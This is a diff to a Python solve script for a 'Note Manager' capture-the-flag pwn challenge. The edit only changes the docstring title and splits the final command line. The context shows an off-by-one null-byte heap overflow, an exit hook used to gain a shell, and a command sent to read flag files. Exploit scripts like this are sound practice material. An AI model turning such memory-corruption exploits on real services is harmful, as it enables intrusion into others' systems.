@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Solve script for Note Manager (CTF7 pwnable, 500pts)
+Solve script for the Note Manager pwn challenge (500pts)
 
 Vulnerability: off-by-one null-byte overflow in the edit (append) function.
   - fill note0 with 31 bytes, then append 1 byte
@@ -141,7 +141,11 @@ log.info('triggering hook via exit…')
 r.sendline(b'5')
 try:
     # If win() drops us into a shell, proactively try common flag paths.
-    r.sendline(b'cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null || cat flag 2>/dev/null || cat flag.txt 2>/dev/null')
+    cmd = (
+        b'cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null || '
+        b'cat flag 2>/dev/null || cat flag.txt 2>/dev/null'
+    )
+    r.sendline(cmd)
 except EOFError:
     pass
 
